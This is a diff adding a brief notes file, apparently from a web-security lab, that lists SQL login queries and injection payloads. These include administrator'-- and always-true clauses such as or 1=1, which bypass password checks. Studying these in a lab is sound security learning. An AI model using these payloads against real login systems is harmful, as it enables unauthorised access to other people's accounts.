@@ -1,0 +1,16 @@
+SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'
+
+
+administrator'--
+
+
+
+SELECT * FROM users WHERE username = 'administrator'--' AND password = ''
+
+
+SELECT * FROM users WHERE username = '' AND password = 'password'--'
+
+
+SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese' or 1=1
+
+SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese' or 9999=9999
